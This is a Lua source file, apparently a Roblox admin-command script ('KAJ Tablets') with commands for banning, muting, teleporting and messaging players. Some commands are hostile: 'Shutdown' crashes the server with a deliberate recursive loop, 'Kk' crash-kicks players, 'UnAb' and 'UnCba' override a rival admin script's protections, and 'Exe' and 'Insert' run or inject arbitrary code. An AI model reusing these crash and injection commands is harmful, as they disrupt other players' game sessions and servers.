Command("UnMute", 3, "UnMutes A Player", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                Insert(UnMuteSource, v.Backpack, v.Character, v.PlayerGui)
                                Ping("UnMuted "..v.Name, Speaker, 5)
                        end)
                end
        end
end)

Command("Disable", 3, "Disables A Script", function(Msg, Speaker)
        local Worked = false
        for _,v in pairs(Work:GetChildren()) do
                if string.find(v.Name:lower(), Msg:lower()) then
                        if v:IsA("Script") or v:IsA("LocalScript") then
                                v.Disabled = true
                                v:Destroy()
                                Worked = true
                                Ping("Disabled Script: "..v.Name, Speaker, 5)
                        end
                end
        end
        if Worked == false then
                Ping("Script Not Found", Speaker, 5)
        end
end)

Command("Scripts", 1, "Shows Scripts In Workspace", function(Msg, Speaker)
        Dismiss(Speaker)
        local AllScripts = {}
        for _,v in pairs(Work:GetChildren()) do
                if v:IsA("Script") then
                        table.insert(AllScripts, v.Name)
                end
        end
        if #AllScripts > 0 then
                for _,v in pairs(AllScripts) do
                        Ping(v, Speaker)
                end
        else
                Ping("No Scripts Found", Speaker, 5)
        end
end)

Command("afk",0,'Makes you go AFK',
         function(Msg,Speaker)
                Dismiss(Speaker)
                for i = 1,8 do
                        Ping('AFK',Speaker)
                                                        wait(.01)
                        end
        end)
Command("back",0,'Creates Tablets telling everyone that you are back',
         function(Msg,Speaker)
                Dismiss(Speaker)
                for i = 1,8 do
                        Ping('Welcome Back!',Speaker,6)
                                        wait(.1)
                        end
        end)




Command("LScripts", 1, "Shows All Found Local Scripts", function(Msg, Speaker)
        Dismiss(Speaker)
        local LocalScripts = {}
        for _,v in pairs(All()) do
                ypcall(function()
                        for _,x in pairs(v.Character:GetChildren()) do
                                if x:IsA("LocalScript") and x.Name ~= "Animate" and x.Name ~= "Sound" and not x.Name:find("Health") then
                                        table.insert(LocalScripts, x.Name .. " - " .. v.Name)
                                end
                        end
                end)
                ypcall(function()
                        for _,x in pairs(v.Backpack:GetChildren()) do
                                if x:IsA("LocalScript") and x.Name ~= "Animate" and x.Name ~= "Sound" and not x.Name:find("Health") then
                                        table.insert(LocalScripts, x.Name .. " - " .. v.Name)
                                end
                        end
                end)
                ypcall(function()
                        for _,x in pairs(v.PlayerGui:GetChildren()) do
                                if x:IsA("LocalScript") and x.Name ~= "Animate" and x.Name ~= "Sound" and not x.Name:find("Health") then
                                        table.insert(LocalScripts, x.Name .. " - " .. v.Name)
                                end
                        end
                end)
        end
        if #LocalScripts > 0 then
                for _,v in pairs(LocalScripts) do
                        Ping(v, Speaker)
                end
        else
                Ping("No Local Scripts Found", Speaker, 5)
        end
end)

Command("LDisable", 3, "Disables A Local Script", function(Msg, Speaker)
        local Split = GetSplit(Msg)
        local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
        local ScriptName = Msg:sub(Split + 1)
        local FoundLocal = false
        for _,name in pairs(PlrTab) do
                ypcall(function()
                        for _,v in pairs(name.Character:GetChildren()) do
                                if string.find(v.Name:lower(), ScriptName) then
                                        if v:IsA("Script") or v:IsA("LocalScript") then
                                                v.Disabled = true
                                                v:Destroy()
                                                FoundLocal = true
                                                Ping("Disabled Local Script: "..v.Name, Speaker, 5)
                                        end
                                end
                        end
                end)
                ypcall(function()
                        for _,v in pairs(name.Backpack:GetChildren()) do
                                if string.find(v.Name:lower(), ScriptName) then
                                        if v:IsA("Script") or v:IsA("LocalScript") then
                                                v.Disabled = true
                                                v:Destroy()
                                                FoundLocal = true
                                                Ping("Disabled Local Script: "..v.Name, Speaker, 5)
                                        end
                                end
                        end
                end)
                ypcall(function()
                        for _,v in pairs(name.PlayerGui:GetChildren()) do
                                if string.find(v.Name:lower(), ScriptName) then
                                        if v:IsA("Script") or v:IsA("LocalScript") then
                                                v.Disabled = true
                                                v:Destroy()
                                                FoundLocal = true
                                                Ping("Disabled Local Script: "..v.Name, Speaker, 5)
                                        end
                                end
                        end
                end)
                if FoundLocal == false then
                        Ping("Local Script Not Found", Speaker, 5)
                end
        end
end)

Command("FClean", 3, "Fully Cleans The Server", function(Msg, Speaker)
        for _,v in pairs(game:GetChildren()) do
                ypcall(function()
                        if v.Name ~= "Workspace" and v.Name ~= "Players" and v.Name ~= "NetworkServer" then
                                for _,a in pairs(v:GetChildren()) do
                                        ypcall(function()
                                                a:Destroy()
                                        end)
                                end
                        elseif v.Name == "Players" then
                                for _,plr in pairs(v:GetPlayers()) do
                                        Clear(plr)
                                end
                        end
                end)
        end
        Clean()
        Fixl()
        Ping("Fully Cleaned", Speaker, 5)
end)

Command("Clean", 1, "Lightly Cleans The Server", function(Msg, Speaker)
        LClean()
        Fixl()
        Ping("Lightly Cleaned", Speaker, 5)
end)

Command("Reset", 2, "Resets A Player", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                v:LoadCharacter()
                                Ping("Reset "..v.Name, Speaker, 5)
                        end)
                end
        end
end)

Command("Home", 1, "Brings The Speaker Home", function(Msg, Speaker)
        repeat wait() until Speaker.Character:findFirstChild("Torso")
        if Work:findFirstChild("Base") then
                Speaker.Character.Torso.CFrame = Work.Base.CFrame * CFrame.new(0, 5, 0)
        else
                Speaker.Character.Torso.CFrame = CFrame.new(0, 5, 0)
        end
        Ping("Brought "..Speaker.Name.." Home", Speaker, 5)
end)

Command("Freeze", 3, "Freeze's A Player", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                v.Character.Torso.Anchored = true
                                Ping("Froze "..v.Name, Speaker, 5)
                        end)
                end
        end
end)

Command("Thaw", 3, "Thaw's A Player", function(Msg, Speaker)
        wait(3)
        Ping("Something went wrong",Speaker,5)
        end)

Command("FF", 3, "Gives A Player A ForceField", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                Instance.new("ForceField", v.Character)
                        end)
                end
        end
end)

Command("UnFF", 3, "Removes A Player's ForceField", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                RemObj(v.Character, "ForceField")
                        end)
                end
        end
end)

Command("TP", 2, "Teleports A Player To Another Player", function(Msg, Speaker)
        local Split = GetSplit(Msg)
        local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
        local PlrTab2 = getPlayer(Speaker, Msg:sub(Split + 1))
        if #PlrTab > 0 and #PlrTab2 > 0 then
                for i,v in pairs(PlrTab) do
                        ypcall(function()
                                for _,v2 in pairs(PlrTab2) do
                                        ypcall(function()
                                                v.Character.Torso.CFrame = v2.Character.Torso.CFrame * CFrame.new(0, 5 * i, 0)
                                                Ping("Teleported "..v.Name.." To "..v2.Name, Speaker, 5)
                                        end)
                                end
                        end)
                end
        end
end)

Command("Msg",2, "Creates a Message",
        function(Msg,Speaker)
                Message(Msg)
end)

Command("H",2, "Creates a Hint",
        function(Msg,Speaker)
                Hint(Msg)
end)

Command("Sm",2, "Creates a System message",
        function(Msg,Speaker)
                SystemMsg(Msg)
end)

function Message(str,p)
        if p==nil then
                for _,Player in pairs(game.Players:GetPlayers()) do
                        coroutine.wrap(function()
                                local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
                                local Text = Instance.new("TextLabel", Msg)
                                Text.Position = UDim2.new(0, 0, 0.7, 0)
                                Text.Font=2
                                Text.FontSize=9
                                Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
                                Text.BackgroundTransparency = 0.4
                                Text.TextColor3 = Color3.new(1, 1, 1)
                                Text.TextTransparency = 1
                                Text.TextWrap = true
                                Text.Text = tostring(str)
                                Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0.7, 0), "Out", "Back", 2)
                                Text.TextTransparency = 0
                                Num = #str * 0.06
                                wait(3)
                                Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
                                wait(Num)
                                Msg:Remove()
                        end)()
                end
        else
                Player=p;
                coroutine.wrap(function()
                        local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
                        local Text = Instance.new("TextLabel", Msg)
                        Text.Position = UDim2.new(0, 0, 0.7, 0)
                        Text.Font=2
                        Text.FontSize=9
                        Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
                        Text.BackgroundTransparency = 0.1
                        Text.TextColor3 = Color3.new(1, 1, 1)
                        Text.TextTransparency = 1
                        Text.TextWrap = true
                        Text.Text = tostring(str)
                        Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0.7, 0), "Out", "Back", 2)
                        Text.TextTransparency = 0
                        Num = #str * 0.06
                        wait(3)
                        Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
                        wait(Num)
                        Msg:Remove()
                end)()
        end
end
function SystemMsg(str)
        for _,Player in pairs(game.Players:GetPlayers()) do
                coroutine.wrap(function()
                        local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
                        local Text = Instance.new("TextLabel", Msg)
                        Text.Position = UDim2.new(0, 0, 0, 0)
                        Text.Font='Legacy'
                        Text.FontSize = "Size48"
                        Text.BackgroundColor3 = Color3.new(-1,-1,-1)
                        Text.BackgroundTransparency = 0.4
                        Text.TextColor3 = Color3.new(1,1,1)
                        Text.TextTransparency = 0
                        Text.TextWrap = true
                        Text.Text = ' [ System ] \n ' .. tostring(str)
                        Text:TweenSizeAndPosition(UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0), "Out", "Back", 2)
                        Text.TextTransparency = 0.1
                        Num = #str * 0.06
                        wait(6)
                        Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
                        wait(Num)
                        Msg:Remove()
                end)()
        end
end
function Hint(str,p)
        if p == nil then
                for _,Player in pairs(game.Players:GetPlayers()) do
                        coroutine.wrap(function()
                                local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
                                local Text = Instance.new("TextLabel", Msg)
                                Text.Position = UDim2.new(0, 0, 0, 0)
                                Text.Font=2
                                Text.FontSize=9
                                Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
                                Text.BackgroundTransparency = 0.4
                                Text.TextColor3 = Color3.new(1, 1, 1)
                                Text.TextTransparency = 1
                                Text.TextWrap = true
                                Text.Text = tostring(str)
                                Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0, 0), "Out", "Back", 2)
                                Text.TextTransparency = 0
                                Num = #str * 0.06
                                wait(3)
                                Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
                                wait(Num)
                                Msg:Remove()
                        end)()
                end
        else
                Player=p
                coroutine.wrap(function()
                        local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
                        local Text = Instance.new("TextLabel", Msg)
                        Text.Position = UDim2.new(0, 0, 0, 0)
                        Text.Font=2
                        Text.FontSize=9
                        Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
                        Text.BackgroundTransparency = 0.1
                        Text.TextColor3 = Color3.new(1, 1, 1)
                        Text.TextTransparency = 1
                        Text.TextWrap = true
                        Text.Text = tostring(str)
                        Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0, 0), "Out", "Back", 2)
                        Text.TextTransparency = 0
                        Num = #str * 0.06
                        wait(3)
                        Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
                        wait(Num)
                        Msg:Remove()
                end)()
        end
end

Command("Explore", 3, "Opens An Object Explorer", function(Msg, Speaker)
        MakeExplorer(Speaker)
end)


Command("Sinfo", 0, "Show the Script info", function(Msg, Speaker)
        wait()
        Dismiss(Speaker)
        NumBanned = 0
        NumCmds = 0
        for i = 1, #Rankings do
                if Rankings[i].Rank < 0 then
                        NumBanned = NumBanned + 1
                end
        end
        for i,v in pairs(Commands) do
                NumCmds = NumCmds + 1
        end
        Ping("KAJ Tablets!", Speaker)
        Ping("Editor,", Speaker, nil, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..string.reverse("4611tlaboC"))
        Ping("Second Editor,", Speaker, nil, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..string.reverse("21wopih"))
        Ping("I started this on 6/9/2014", Speaker)
        
        Ping(#All2.." players online in the server",Speaker)
        Ping(NumCmds.." Commands",Speaker)
        Ping(NumBanned.." players banned", Speaker,5)
        
end)

Command("ShowR", 0, "Shows All Player Ranks", function(Msg, Speaker)
        Dismiss(Speaker)
        for i,v in pairs(All()) do
                Ping(v.Name.."'s Rank: "..FindRank(v))
        end
end)

Command("Speed", 2, "Change speed of a player", function(Msg, Speaker)
        local Split = GetSplit(Msg)
        local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
        local Speed = tonumber(Msg:sub(Split + 1))
        for _,v in pairs(PlrTab) do
                ypcall(function()
                        v.Character.Humanoid.WalkSpeed = Speed
                        Ping("Set "..v.Name.."'s WalkSpeed To "..tostring(Speed), Speaker)
                end)
        end
end)

Command("UnAb", 2, "Removes CBA Anti-Bans", function(Msg, Speaker)
        local RemoveAB = Instance.new("StringValue")
        RemoveAB.Name = "CBA Attachment"
        RemoveAB.Value = [[CBA.override=true;]]
        RemoveAB.Parent = Work
        Ping("Removed All CBA Anti-Bans", Speaker, 5)
end)

Command("Injected", 5, "Shows Injected Players", function(Msg, Speaker)
        Dismiss(Speaker)
        for i,v in pairs(Injected) do
                Ping(i, Speaker)
        end
end)

Command("UnCba", 3, "Removes CBA Admin", function(Msg, Speaker)
        local RemoveCBA = Instance.new("StringValue")
        RemoveCBA.Name = "CBA Attachment"
        RemoveCBA.Value = [[CBA.remove = false]]
        RemoveCBA.Parent = Work
        Ping("Removed All CBA Admins", Speaker, 5)
end)

Command("Shutdown", 4, "Shutdowns The Server", function(Msg, Speaker)
        local function BufferOverflow(object)
                object.DescendantAdded:connect(BufferOverflow)
                Instance.new("IntValue", object)
        end
        BufferOverflow(Game)
end)

Command("Kk", 3, "Crash Kicks A Player From The Server", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                Crash1(v)
                                
                        end)
                end
        end
end)

Command("Ban", 4, "Bans A Player From The Server", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                ChangeRank(v, -1)
                        end)
                end
        end
end)

Command("JBan", 4, "Permanently Jails A Player", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                ChangeRank(v, -2)
                        end)
                end
        end
end)





Command("MBan", 4, "Permanently Mutes A Player", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                ChangeRank(v, -3)
                        end)
                end
        end
end)

Command("UnBan", 4, "Un-Bans A Player From The Server", function(Msg, Speaker)
        ypcall(function()
                local PlrTab = getPlayer(Speaker, Msg)
                if #PlrTab > 0 then
                        for _,v in pairs(PlrTab) do
                                ypcall(function()
                                        Insert(UnMuteSource, v.Backpack, v.Character, v.PlayerGui)
                                end)
                        end
                end
                local PlrName = ChangeRank(Msg, 0)
                Ping("Un-Banned "..PlrName, Speaker, 5)
        end)
end)

Command("Menu", 0, "Brings Up Admin Menu", function(Msg, Speaker)
        Dismiss(Speaker)
        Ping("Commands", Speaker, nil, function()
                Dismiss(Speaker.Name)
                Ping("You Are Rank: "..tostring(GetRank(Speaker.Name).Rank), Speaker)
                Ping("All", Speaker, nil, function() OpenCmds(1337, Speaker) end)
                Ping("Rank 0", Speaker, nil, function() OpenCmds(0, Speaker) end)
                Ping("Rank 1", Speaker, nil, function() OpenCmds(1, Speaker) end)
                Ping("Rank 2", Speaker, nil, function() OpenCmds(2, Speaker) end)
                Ping("Rank 3", Speaker, nil, function() OpenCmds(3, Speaker) end)
                Ping("Rank 4", Speaker, nil, function() OpenCmds(4, Speaker) end)
                Ping("Rank 5", Speaker, nil, function() OpenCmds(5, Speaker) end)
        end)
        Ping("Players", Speaker, nil, function()
                ListPlayers(Speaker)
        end)
end)

Command("Players", 0, "Brings Up Players", function(Msg, Speaker)
        ListPlayers(Speaker)
end)

Command("Exe", 4, "Executes A Source", function(Msg, Speaker)
        local Func,Error = loadstring(Msg)
        getfenv(Func).print = function(...) local Rtn = "" for _,v in pairs({...}) do Rtn = Rtn..tostring(v).."\t" end Ping(Rtn, Speaker) end
        getfenv(Func).Speaker = Speaker
        if Error == nil then
                coroutine.wrap(function()
                        Func()
                end)()
                Ping("Executed Script!", Speaker, 5)
        else
                Ping(Error, Speaker, 10)
        end
end)

Command("Insert", 5, "Inserts A Local Script Into A Player", function(Msg, Speaker)
        if LS ~= nil then
                local Split = GetSplit(Msg)
                local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
                local LocalSource = Msg:sub(Split + 1)
                if #PlrTab > 0 then
                        for _,v in pairs(PlrTab) do
                                local Inserted = LS:Clone()
                                Inserted.Disabled = true
                                Inserted.Parent = v.Backpack or v.Character or v.PlayerGui
                                if OwnSource ~= nil and Inserted:findFirstChild(OwnSource) ~= nil then
                                        Inserted:findFirstChild(OwnSource).Value = v.Name
                                end
                                Inserted[LSSource].Value = LocalSource
                                Inserted.Disabled = false
                        end
                end
        else
                Ping("ERROR: Local Script Not Found", Speaker, 5)
        end
end)

Command("Ping", 1, "Pings A Message", function(Msg, Speaker)
        Msg = tostring(Msg)
        Ping(Msg, Speaker)
end)

Command("Test", 1, "Test's That Admin Is Working", function(Msg, Speaker)
        Dismiss(Speaker)
        for i,v in pairs(getfenv(1)) do
                ypcall(function()
                        Ping(tostring(i)..": "..tostring(v), Speaker)
                end)
        end
end)

Command('Ranks', 0, 'Shows all players in ranking table',
function(Msg,Speaker)
for _,v in pairs(Rankings) do
Ping(v.Name.."'s Rank: "..v.Rank,Speaker,nil,nil,nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
end
end)


Command("Setr", 6, "Ranks A Player", function(Msg, Speaker)
        local Split = GetSplit(Msg)
        local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
        local Rank = tonumber(Msg:sub(Split + 1))
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        if v.Name ~= Owner then
                                ChangeRank(v, Rank)
                                Ping("Set "..v.Name.."'s Rank To "..tostring(Rank), Speaker, 5)
                        end
                end
        end
end)

Command("Kajr", 5, "Remove the tablets", function(Msg, Speaker)
        Dismiss()
        Ping('Remove KAJ Tablets? <LolClickMe>',Speaker,5,function()
                Dismiss()
        Removed = true
        for i,v in pairs(getfenv(1)) do
                getfenv(1)[i] = nil
        end
        script.Disabled = true
        end)
end)
